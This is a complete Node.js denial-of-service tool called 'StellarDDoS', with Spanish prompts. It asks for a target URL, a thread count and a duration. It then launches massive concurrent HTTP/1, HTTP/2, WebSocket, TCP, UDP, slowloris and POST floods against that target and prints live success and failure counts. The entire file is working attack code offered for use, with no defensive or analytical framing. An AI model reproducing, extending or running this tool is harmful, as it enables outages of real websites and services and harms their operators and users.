#!/usr/bin/env node 'use strict';

const net = require('net'); const dgram = require('dgram'); const http = require('http'); const https = require('https'); const http2 = require('http2'); const WebSocket = require('ws'); const { performance } = require('perf_hooks'); const readline = require('readline'); const chalk = require('chalk');

class StellarDDoS { constructor() { this.stats = { total: 0, success: 0, failed: 0, startTime: 0 }; this.running = false; this.anim = ['|', '/', '-', '.']; this.animIdx = 0; }

startAttack(target, options = {}) {
    if (this.running) {
        console.log(chalk.red('Ataque ya en ejecución'));
        return;
    }
    const threads = options.threads || 200;
    const duration = options.duration || 30;
    const url = new URL(target);
    const protocol = target.startsWith('https') ? https : http;

    this.running = true;
    this.stats.startTime = performance.now();
    this.agent = new protocol.Agent({ keepAlive: true, maxSockets: threads * 1000 });
    this.udpSocket = dgram.createSocket('udp4').on('error', () => {});
    this.showInt = setInterval(() => this.showStats(), 10);
    this.animInt = setInterval(() => this.animIdx = (this.animIdx + 1) % this.anim.length, 10);

    for (let i = 0; i < threads * 200; i++) this.floodHTTP1(url, protocol);
    for (let i = 0; i < threads * 100; i++) this.floodHTTP2(url);
    for (let i = 0; i < threads * 200; i++) this.floodWebSocket(url);
    for (let i = 0; i < threads * 200; i++) this.tcpFlood(url);
    for (let i = 0; i < threads * 100; i++) this.udpFlood(url);
    for (let i = 0; i < threads * 50; i++) this.slowloris(url, protocol);
    for (let i = 0; i < threads * 100; i++) this.floodHTTPPost(url, protocol);

    setTimeout(() => this.stop(), duration * 1000);
}

floodHTTP1(url, protocol) {
    if (!this.running) return;
    const options = {
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname + '?' + Math.random().toString(36).slice(2),
        method: 'GET',
        headers: { 'User-Agent': 'Mozilla/5.0', Connection: 'keep-alive' },
        agent: this.agent
    };
    const req = protocol.request(options, res => {
        res.on('data', () => {});
        res.on('end', () => this.onSuccess());
    });
    req.on('error', () => this.onFail());
    for (let j = 0; j < 200; j++) {
        req.write(`GET ${url.pathname}?${Math.random().toString(36).slice(2)} HTTP/1.1\r\nHost: ${url.hostname}\r\nConnection: keep-alive\r\n\r\n`);
    }
    req.setTimeout(500, () => req.destroy());
    req.end();
}

floodHTTP2(url) {
    if (!this.running) return;
    const client = http2.connect(url.origin);
    client.on('error', () => client.close());
    for (let i = 0; i < 100; i++) {
        const req = client.request({ ':path': url.pathname + '?' + Math.random().toString(36).slice(2), ':method': 'GET' });
        req.on('data', () => {});
        req.on('end', () => { this.onSuccess(); req.close(); });
        req.end();
    }
    setTimeout(() => client.close(), 1000);
}

floodHTTPPost(url, protocol) {
    if (!this.running) return;
    const options = {
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname + '?' + Math.random().toString(36).slice(2),
        method: 'POST',
        headers: { 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded', Connection: 'keep-alive' },
        agent: this.agent
    };
    const req = protocol.request(options, res => {
        res.on('data', () => {});
        res.on('end', () => this.onSuccess());
    });
    req.on('error', () => this.onFail());
    const body = `data=${Math.random().toString(36).slice(2)}`;
    req.write(body);
    req.end();
}

floodWebSocket(url) {
    if (!this.running) return;
    const wsUrl = url.origin.replace(/^http/, 'ws');
    const ws = new WebSocket(wsUrl);
    ws.on('open', () => {
        const msg = 'X'.repeat(2048);
        const flood = () => {
            if (!this.running) return ws.close();
            ws.send(msg, err => err ? this.onFail() : this.onSuccess());
            setImmediate(flood);
        };
        flood();
    });
    ws.on('error', () => this.onFail());
}

tcpFlood(url) {
    if (!this.running) return;
    const sock = net.connect({ host: url.hostname, port: url.port || 80 }, () => {
        this.onSuccess();
        sock.destroy();
        if (this.running) this.tcpFlood(url);
    });
    sock.on('error', () => { this.onFail(); if (this.running) this.tcpFlood(url); });
}

udpFlood(url) {
    if (!this.running) return;
    const msg = Buffer.alloc(4096);
    this.udpSocket.send(msg, url.port || 80, url.hostname, err => {
        err ? this.onFail() : this.onSuccess();
        if (this.running) this.udpFlood(url);
    });
}

slowloris(url, protocol) {
    if (!this.running) return;
    const host = url.hostname;
    const port = url.port || (url.protocol === 'https:' ? 443 : 80);
    const sock = net.connect(port, host, () => {
        sock.write(`POST ${url.pathname} HTTP/1.1\r\nHost: ${host}\r\n`);
        sock.write('User-Agent: Mozilla/5.0\r\n');
        const interval = setInterval(() => {
            if (!this.running) { clearInterval(interval); sock.destroy(); return; }
            sock.write(`X-a: ${Math.random()}\r\n`);
        }, 1000);
    });
    sock.on('error', () => this.onFail());
}

onSuccess() { this.stats.success++; this.stats.total++; process.stdout.write(chalk.green('.')); }
onFail()    { this.stats.failed++; this.stats.total++; process.stdout.write(chalk.red('x')); }

showStats() {
    const e = ((performance.now() - this.stats.startTime) / 1000).toFixed(2);
    process.stdout.write(
        `\r${chalk.greenBright(this.anim[this.animIdx])} ${e}s | Total:${this.stats.total} | ` +
        `${chalk.green(this.stats.success)} | ${chalk.red(this.stats.failed)}`
    );
}

stop() {
    if (!this.running) return;
    clearInterval(this.showInt);
    clearInterval(this.animInt);
    this.udpSocket.close();
    const e = ((performance.now() - this.stats.startTime) / 1000).toFixed(2);
    console.log(chalk.green(`\nAtaque finalizado en ${e}s`));
    console.log(chalk.blue(`Total de peticiones: ${this.stats.total}`));
    console.log(chalk.green(`Éxitos: ${this.stats.success}`) + ' | ' + chalk.red(`Fallidos: ${this.stats.failed}`));
    process.exit(0);
}

}

const rl = readline.createInterface({ input: process.stdin, output: process.stdout }); const stellar = new StellarDDoS(); rl.question(chalk.greenBright('URL objetivo: '), target => { rl.question(chalk.greenBright('Número de hilos (200): '), threads => { rl.question(chalk.greenBright('Duración (30s): '), duration => { stellar.startAttack(target, { threads: parseInt(threads) || 200, duration: parseInt(duration) || 30 }); rl.on('line', line => { if (line.trim() === 'stop') { stellar.stop(); rl.close(); } }); }); }); }); rl.on('close', () => stellar.stop());

